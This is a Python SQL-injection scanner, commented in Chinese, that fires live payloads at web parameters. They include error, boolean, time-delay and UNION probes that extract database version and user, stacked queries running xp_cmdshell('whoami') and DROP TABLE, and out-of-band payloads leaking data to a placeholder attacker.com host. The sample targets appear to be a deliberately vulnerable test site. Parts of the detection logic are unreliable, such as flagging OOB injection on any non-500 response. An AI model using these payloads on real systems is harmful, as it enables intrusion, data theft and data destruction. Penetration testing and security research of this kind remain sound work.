import time
import requests
import hashlib
import base64
import json
import re
from urllib.parse import quote, unquote

class AdvancedSQLDetector:
    def __init__(self, config_file="sql_config.json"):
        self.config = self.load_config(config_file)
        self.session = requests.Session()
        self.session.headers.update(self.config.get('request_config', {}).get('headers', {}))
        self.timeout = self.config.get('request_config', {}).get('timeout', 10)
        
        # 基准响应存储（用于布尔盲注对比）
        self.baseline_responses = {}
        
        # 结果存储
        self.results = {
            "vulnerabilities": [],
            "statistics": {
                "tested_payloads": 0,
                "positive_results": 0,
                "false_positives": 0,
                "injection_types": {}
            }
        }
    
    def load_config(self, config_file):
        """加载配置文件"""
        try:
            with open(config_file, 'r') as f:
                return json.load(f)
        except:
            return self.get_default_config()
    
    def get_default_config(self):
        """默认配置"""
        return {
            "time_based_threshold": 3.0,
            "length_variation_threshold": 0.3,
            "response_similarity_threshold": 0.7,
            "dns_timeout": 5,
            "boolean_true_indicators": ["welcome", "success", "exists", "found", "登录成功"],
            "boolean_false_indicators": ["error", "invalid", "not found", "failed", "access denied"]
        }
    
    def check_sql_injection(self, url, param_name, param_value, method="GET", post_data=None):
        """
        全面的SQL注入检测入口
        """
        print(f"\n🔍 开始全面检测SQL注入: {url}")
        print(f"   参数: {param_name} = {param_value}")
        print(f"   方法: {method}")
        
        # 获取基准响应（用于后续对比）
        baseline = self.get_baseline_response(url, param_name, param_value, method, post_data)
        
        # 执行所有类型的检测
        detection_results = []
        
        # 1. 基于错误的检测
        print("\n[1/6] 基于错误的注入检测...")
        error_result = self.detect_error_based(url, param_name, param_value, method, post_data, baseline)
        if error_result:
            detection_results.append(error_result)
            print(f"   ✅ 发现错误型注入漏洞")
        
        # 2. 布尔盲注检测
        print("[2/6] 布尔盲注检测...")
        boolean_result = self.detect_boolean_based(url, param_name, param_value, method, post_data, baseline)
        if boolean_result:
            detection_results.append(boolean_result)
            print(f"   ✅ 发现布尔盲注漏洞")
        
        # 3. 时间盲注检测
        print("[3/6] 时间盲注检测...")
        time_result = self.detect_time_based(url, param_name, param_value, method, post_data)
        if time_result:
            detection_results.append(time_result)
            print(f"   ✅ 发现时间盲注漏洞")
        
        # 4. 联合查询检测
        print("[4/6] 联合查询注入检测...")
        union_result = self.detect_union_based(url, param_name, param_value, method, post_data, baseline)
        if union_result:
            detection_results.append(union_result)
            print(f"   ✅ 发现联合查询注入漏洞")
        
        # 5. 堆叠查询检测
        print("[5/6] 堆叠查询检测...")
        stacked_result = self.detect_stacked_queries(url, param_name, param_value, method, post_data)
        if stacked_result:
            detection_results.append(stacked_result)
            print(f"   ✅ 发现堆叠查询漏洞")
        
        # 6. 带外数据检测（DNS/HTTP）
        print("[6/6] 带外数据检测...")
        oob_result = self.detect_out_of_band(url, param_name, param_value, method, post_data)
        if oob_result:
            detection_results.append(oob_result)
            print(f"   ✅ 发现带外数据泄露漏洞")
        
        # 综合判定
        final_verdict = self.evaluate_results(detection_results, baseline)
        
        return final_verdict, detection_results
    
    def get_baseline_response(self, url, param_name, param_value, method, post_data):
        """获取基准响应"""
        baseline_key = f"{url}_{param_name}_{method}"
        
        if baseline_key in self.baseline_responses:
            return self.baseline_responses[baseline_key]
        
        try:
            if method.upper() == "GET":
                # 正常参数请求
                parsed_url = self._build_url_with_param(url, param_name, param_value)
                response = self.session.get(parsed_url, timeout=self.timeout)
            else:
                # POST请求
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                response = self.session.post(url, data=data, timeout=self.timeout)
            
            baseline = {
                'content': response.text,
                'length': len(response.text),
                'status': response.status_code,
                'time': 0,
                'headers': dict(response.headers),
                'hash': hashlib.md5(response.text.encode()).hexdigest()
            }
            
            self.baseline_responses[baseline_key] = baseline
            return baseline
            
        except Exception as e:
            print(f"获取基准响应失败: {e}")
            return None
    
    def _build_url_with_param(self, url, param_name, value):
        """构建带参数的URL"""
        from urllib.parse import urlparse, parse_qs, urlencode
        
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        query_dict[param_name] = [value]
        
        new_query = urlencode(query_dict, doseq=True)
        return parsed._replace(query=new_query).geturl()
    
    # ==================== 基于错误的注入检测 ====================
    def detect_error_based(self, url, param_name, param_value, method, post_data, baseline):
        """基于错误的SQL注入检测"""
        error_payloads = [
            "'",
            "\"",
            "'\"",
            "`",
            "' OR '1'='1",
            "' AND 1=CONVERT(int, @@version)--",
            "' AND 1=CAST((SELECT version()) AS int)--",
            "' OR EXP(~(SELECT * FROM (SELECT VERSION())a))--",
            "' OR (SELECT 1 FROM (SELECT SLEEP(5))a)--",
            "'; WAITFOR DELAY '00:00:05'--"
        ]
        
        for payload in error_payloads:
            try:
                test_value = f"{param_value}{payload}"
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    response = self.session.post(url, data=data, timeout=self.timeout)
                
                # 检查响应中是否包含数据库错误信息
                error_found = self._check_for_database_errors(response.text)
                
                if error_found:
                    return {
                        'type': 'Error-Based SQL Injection',
                        'payload': payload,
                        'confidence': 'High',
                        'evidence': error_found[:200],
                        'response_code': response.status_code,
                        'response_length': len(response.text),
                        'technique': 'Error message disclosure'
                    }
                    
            except Exception as e:
                continue
        
        return None
    
    def _check_for_database_errors(self, response_text):
        """检查响应中的数据库错误信息"""
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"SQLite/JDBCDriver",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"SQL Server.*Driver",
            r"Msg \d+, Level \d+, State \d+",
            r"Unclosed quotation mark",
            r"Syntax error.*SQL",
            r"ORA-\d{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"PostgreSQL query failed"
        ]
        
        for pattern in error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        
        return None
    
    # ==================== 布尔盲注检测 ====================
    def detect_boolean_based(self, url, param_name, param_value, method, post_data, baseline):
        """布尔盲注检测"""
        if not baseline:
            return None
        
        # 真条件payload
        true_payloads = [
            "' AND '1'='1",
            "' AND 1=1",
            "' OR 1=1--",
            "') OR ('1'='1",
            "' AND ASCII(SUBSTRING(@@version,1,1))>0--"
        ]
        
        # 假条件payload
        false_payloads = [
            "' AND '1'='2",
            "' AND 1=2",
            "' OR 1=2--",
            "') AND ('1'='2",
            "' AND ASCII(SUBSTRING(@@version,1,1))>255--"
        ]
        
        # 测试真条件
        true_response = None
        for payload in true_payloads:
            true_response = self._test_boolean_condition(
                url, param_name, param_value, method, post_data, payload
            )
            if true_response:
                break
        
        # 测试假条件
        false_response = None
        for payload in false_payloads:
            false_response = self._test_boolean_condition(
                url, param_name, param_value, method, post_data, payload
            )
            if false_response:
                break
        
        if true_response and false_response:
            # 对比响应差异
            similarity_with_true = self._calculate_similarity(
                baseline['content'], true_response['content']
            )
            similarity_with_false = self._calculate_similarity(
                baseline['content'], false_response['content']
            )
            
            # 布尔盲注特征：真条件与基准相似，假条件与基准不同
            if (similarity_with_true > self.config['response_similarity_threshold'] and 
                similarity_with_false < self.config['response_similarity_threshold']):
                
                # 进一步验证：检查内容长度差异
                length_diff_true = abs(baseline['length'] - true_response['length']) / baseline['length']
                length_diff_false = abs(baseline['length'] - false_response['length']) / baseline['length']
                
                if length_diff_false > length_diff_true * 2:  # 假条件响应有明显差异
                    return {
                        'type': 'Boolean-Based Blind SQL Injection',
                        'confidence': 'Medium-High',
                        'evidence': {
                            'true_similarity': similarity_with_true,
                            'false_similarity': similarity_with_false,
                            'length_difference': {
                                'baseline': baseline['length'],
                                'true': true_response['length'],
                                'false': false_response['length']
                            }
                        },
                        'technique': 'Boolean condition differential'
                    }
        
        return None
    
    def _test_boolean_condition(self, url, param_name, param_value, method, post_data, payload):
        """测试布尔条件"""
        try:
            test_value = f"{param_value}{payload}"
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, test_value)
                response = self.session.get(test_url, timeout=self.timeout)
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = test_value
                response = self.session.post(url, data=data, timeout=self.timeout)
            
            return {
                'content': response.text,
                'length': len(response.text),
                'status': response.status_code
            }
            
        except Exception:
            return None
    
    # ==================== 时间盲注检测 ====================
    def detect_time_based(self, url, param_name, param_value, method, post_data):
        """时间盲注检测"""
        time_payloads = [
            # MySQL
            ("' AND SLEEP(5)--", "mysql"),
            ("' OR SLEEP(5)--", "mysql"),
            ("' AND BENCHMARK(5000000, MD5('test'))--", "mysql"),
            
            # PostgreSQL
            ("' AND (SELECT pg_sleep(5))--", "postgresql"),
            ("'; SELECT pg_sleep(5)--", "postgresql"),
            
            # MSSQL
            ("'; WAITFOR DELAY '00:00:05'--", "mssql"),
            ("' OR WAITFOR DELAY '00:00:05'--", "mssql"),
            
            # SQLite
            ("' AND randomblob(100000000)--", "sqlite"),
            
            # Oracle
            ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0--", "oracle"),
            ("' OR DBMS_LOCK.SLEEP(5)=0--", "oracle")
        ]
        
        # 首先获取正常响应时间
        normal_time = self._measure_response_time(url, param_name, param_value, method, post_data)
        
        for payload, db_type in time_payloads:
            try:
                test_value = f"{param_value}{payload}"
                start_time = time.time()
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    response = self.session.get(test_url, timeout=self.timeout + 10)
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    response = self.session.post(url, data=data, timeout=self.timeout + 10)
                
                elapsed_time = time.time() - start_time
                
                # 检查是否超时或明显延迟
                if elapsed_time > self.config['time_based_threshold']:
                    # 验证：发送不延迟的payload对比
                    no_delay_value = f"{param_value}' AND '1'='1"
                    no_delay_time = self._measure_response_time(
                        url, param_name, no_delay_value, method, post_data
                    )
                    
                    if elapsed_time > no_delay_time * 3:  # 延迟至少3倍
                        return {
                            'type': 'Time-Based Blind SQL Injection',
                            'payload': payload,
                            'database': db_type,
                            'confidence': 'Medium',
                            'evidence': {
                                'normal_response_time': normal_time,
                                'delayed_response_time': elapsed_time,
                                'threshold': self.config['time_based_threshold']
                            },
                            'technique': 'Time delay'
                        }
                        
            except requests.exceptions.Timeout:
                # 超时也可能是时间盲注的特征
                return {
                    'type': 'Time-Based Blind SQL Injection (Timeout)',
                    'payload': payload,
                    'database': db_type,
                    'confidence': 'Low-Medium',
                    'evidence': 'Request timeout occurred',
                    'technique': 'Request timeout'
                }
            except Exception:
                continue
        
        return None
    
    def _measure_response_time(self, url, param_name, param_value, method, post_data):
        """测量响应时间"""
        try:
            start_time = time.time()
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                self.session.get(test_url, timeout=self.timeout)
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                self.session.post(url, data=data, timeout=self.timeout)
            
            return time.time() - start_time
        except:
            return float('inf')
    
    # ==================== 联合查询注入检测 ====================
    def detect_union_based(self, url, param_name, param_value, method, post_data, baseline):
        """联合查询注入检测"""
        # 先探测列数
        column_count = self._detect_column_count(url, param_name, param_value, method, post_data)
        
        if column_count > 0:
            # 尝试在可显示位置注入标记
            marker = "SQL_INJECTION_TEST_" + str(int(time.time()))
            
            # 构建联合查询payload
            select_parts = []
            for i in range(column_count):
                if i == 0:  # 第一个位置放标记
                    select_parts.append(f"'{marker}'")
                else:
                    select_parts.append("NULL")
            
            union_payload = f"' UNION SELECT {','.join(select_parts)}--"
            test_value = f"{param_value}{union_payload}"
            
            try:
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    response = self.session.post(url, data=data, timeout=self.timeout)
                
                # 检查响应中是否包含标记
                if marker in response.text:
                    # 尝试获取数据库信息
                    info_payloads = [
                        f"' UNION SELECT version(),{','.join(['NULL']*(column_count-1))}--",
                        f"' UNION SELECT user(),{','.join(['NULL']*(column_count-1))}--",
                        f"' UNION SELECT database(),{','.join(['NULL']*(column_count-1))}--"
                    ]
                    
                    for info_payload in info_payloads:
                        info_value = f"{param_value}{info_payload}"
                        info_response = self._send_request(url, param_name, info_value, method, post_data)
                        
                        if info_response:
                            # 提取可能的数据库信息
                            db_info = self._extract_database_info(info_response.text)
                            if db_info:
                                return {
                                    'type': 'Union-Based SQL Injection',
                                    'confidence': 'High',
                                    'column_count': column_count,
                                    'evidence': {
                                        'marker_found': True,
                                        'database_info': db_info,
                                        'injectable_column': 0
                                    },
                                    'technique': 'Union query'
                                }
                    
                    return {
                        'type': 'Union-Based SQL Injection',
                        'confidence': 'High',
                        'column_count': column_count,
                        'evidence': {'marker_found': True},
                        'technique': 'Union query'
                    }
                    
            except Exception as e:
                pass
        
        return None
    
    def _detect_column_count(self, url, param_name, param_value, method, post_data):
        """探测联合查询的列数"""
        for i in range(1, 11):  # 尝试1-10列
            null_list = ['NULL'] * i
            order_payload = f"' ORDER BY {i}--"
            union_payload = f"' UNION SELECT {','.join(null_list)}--"
            
            # 先尝试ORDER BY方法
            order_value = f"{param_value}{order_payload}"
            order_response = self._send_request(url, param_name, order_value, method, post_data)
            
            if order_response and order_response.status_code < 500:
                # 再验证UNION查询
                union_value = f"{param_value}{union_payload}"
                union_response = self._send_request(url, param_name, union_value, method, post_data)
                
                if union_response and union_response.status_code < 500:
                    # 检查是否有语法错误
                    error = self._check_for_database_errors(union_response.text)
                    if not error:
                        return i
        
        return 0
    
    # ==================== 堆叠查询检测 ====================
    def detect_stacked_queries(self, url, param_name, param_value, method, post_data):
        """堆叠查询检测（支持多语句执行）"""
        stacked_payloads = [
            # 通用分号测试
            "'; SELECT 'stacked'--",
            "'; WAITFOR DELAY '00:00:02'--",
            "'; EXEC xp_cmdshell('whoami')--",
            "'; DROP TABLE IF EXISTS test_table--"
        ]
        
        for payload in stacked_payloads:
            try:
                test_value = f"{param_value}{payload}"
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    response = self.session.post(url, data=data, timeout=self.timeout)
                
                # 检查响应中是否有堆叠查询的特征
                if self._check_stacked_indicator(response.text):
                    # 验证：发送不包含堆叠的payload
                    safe_value = f"{param_value}' AND '1'='1"
                    safe_response = self._send_request(url, param_name, safe_value, method, post_data)
                    
                    if safe_response and response.text != safe_response.text:
                        return {
                            'type': 'Stacked Queries SQL Injection',
                            'payload': payload,
                            'confidence': 'Medium',
                            'evidence': 'Stacked query indicator found',
                            'technique': 'Multiple statement execution'
                        }
                        
            except Exception:
                continue
        
        return None
    
    def _check_stacked_indicator(self, response_text):
        """检查堆叠查询的指示器"""
        indicators = [
            "stacked",
            "multiple statements",
            "batch execution",
            "xp_cmdshell",
            "command executed"
        ]
        
        for indicator in indicators:
            if indicator.lower() in response_text.lower():
                return True
        
        return False
    
    # ==================== 带外数据检测 ====================
    def detect_out_of_band(self, url, param_name, param_value, method, post_data):
        """带外数据检测（DNS/HTTP）"""
        # 注意：实际环境中需要配置可控制的DNS/HTTP服务器
        # 这里仅提供检测逻辑框架
        
        dns_payloads = [
            # MySQL DNS外带
            ("' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\test'))--", "mysql"),
            
            # MSSQL DNS外带
            ("'; EXEC master..xp_dirtree '\\\\\\\\'+(SELECT @@version)+'.attacker.com\\\\test'--", "mssql"),
            
            # Oracle DNS外带
            ("'||UTL_HTTP.REQUEST('http://'||(SELECT banner FROM v$version WHERE rownum=1)||'.attacker.com/test')--", "oracle")
        ]
        
        for payload, db_type in dns_payloads:
            try:
                test_value = f"{param_value}{payload}"
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    response = self.session.get(test_url, timeout=self.timeout)
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    response = self.session.post(url, data=data, timeout=self.timeout)
                
                # 在实际环境中，这里需要检查DNS/HTTP日志
                # 这里简化处理：如果请求成功且没有错误，则认为是可能的带外漏洞
                if response.status_code < 500:
                    # 可以结合其他特征进一步判断
                    return {
                        'type': 'Out-of-Band SQL Injection',
                        'payload': payload,
                        'database': db_type,
                        'confidence': 'Low-Medium',
                        'evidence': 'OOB payload executed without error',
                        'technique': 'DNS/HTTP exfiltration'
                    }
                    
            except Exception:
                continue
        
        return None
    
    # ==================== 辅助方法 ====================
    def _send_request(self, url, param_name, param_value, method, post_data):
        """发送请求的通用方法"""
        try:
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                return self.session.get(test_url, timeout=self.timeout)
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                return self.session.post(url, data=data, timeout=self.timeout)
        except:
            return None
    
    def _calculate_similarity(self, text1, text2):
        """计算两个文本的相似度（简化版）"""
        if not text1 or not text2:
            return 0
        
        # 使用基于字符的简单相似度计算
        set1 = set(text1[:1000])  # 只比较前1000个字符
        set2 = set(text2[:1000])
        
        if not set1 or not set2:
            return 0
        
        intersection = len(set1.intersection(set2))
        union = len(set1.union(set2))
        
        return intersection / union if union > 0 else 0
    
    def _extract_database_info(self, response_text):
        """从响应中提取可能的数据库信息"""
        patterns = {
            'mysql': r"[\d\.]+-MySQL",
            'postgresql': r"PostgreSQL [\d\.]+",
            'mssql': r"Microsoft SQL Server [\d\.]+",
            'oracle': r"Oracle Database [\d\.]+",
            'sqlite': r"SQLite [\d\.]+"
        }
        
        for db_type, pattern in patterns.items():
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return {
                    'type': db_type,
                    'version': match.group(0)
                }
        
        return None
    
    def evaluate_results(self, detection_results, baseline):
        """综合评估检测结果"""
        if not detection_results:
            return {
                'vulnerable': False,
                'confidence': 'None',
                'summary': 'No SQL injection vulnerabilities detected'
            }
        
        # 按可信度排序
        confidence_map = {'High': 3, 'Medium-High': 2.5, 'Medium': 2, 'Low-Medium': 1.5, 'Low': 1}
        
        # 计算平均可信度
        total_weight = 0
        total_confidence = 0
        
        for result in detection_results:
            weight = confidence_map.get(result.get('confidence', 'Low'), 1)
            total_weight += weight
            total_confidence += weight * confidence_map.get(result['confidence'], 1)
        
        avg_confidence = total_confidence / total_weight if total_weight > 0 else 0
        
        # 确定最终结论
        if avg_confidence >= 2.5:  # High or Medium-High
            verdict = 'Definitely Vulnerable'
            confidence = 'High'
        elif avg_confidence >= 1.5:  # Medium
            verdict = 'Likely Vulnerable'
            confidence = 'Medium'
        else:
            verdict = 'Potentially Vulnerable'
            confidence = 'Low'
        
        # 收集发现的漏洞类型
        vuln_types = set(r['type'] for r in detection_results)
        
        return {
            'vulnerable': True,
            'confidence': confidence,
            'verdict': verdict,
            'detected_types': list(vuln_types),
            'total_findings': len(detection_results),
            'details': detection_results
        }
    
    def generate_report(self, url, results):
        """生成检测报告"""
        report = {
            'target_url': url,
            'scan_time': time.strftime("%Y-%m-%d %H:%M:%S"),
            'summary': results['evaluation'],
            'detailed_findings': results['detections']
        }
        
        # 保存报告
        filename = f"sql_injection_report_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        return filename


# ==================== 使用示例 ====================
if __name__ == "__main__":
    # 创建检测器
    detector = AdvancedSQLDetector()
    
    # 测试URL
    test_cases = [
        {
            "url": "http://testphp.vulnweb.com/artists.php",
            "param": "artist",
            "value": "1",
            "method": "GET"
        },
        {
            "url": "http://testphp.vulnweb.com/login.php",
            "param": "uname",
            "value": "test",
            "method": "POST",
            "data": {"pass": "test"}
        }
    ]
    
    for test in test_cases:
        print("\n" + "="*60)
        result, details = detector.check_sql_injection(
            url=test['url'],
            param_name=test['param'],
            param_value=test['value'],
            method=test.get('method', 'GET'),
            post_data=test.get('data')
        )
        
        print(f"\n📊 检测结果:")
        print(f"   是否易受攻击: {result['vulnerable']}")
        print(f"   可信度: {result.get('confidence', 'N/A')}")
        print(f"   结论: {result.get('verdict', 'N/A')}")
        print(f"   发现类型: {', '.join(result.get('detected_types', []))}")
        
        # 保存报告
        report_file = detector.generate_report(test['url'], {
            'evaluation': result,
            'detections': details
        })
        print(f"   报告已保存: {report_file}")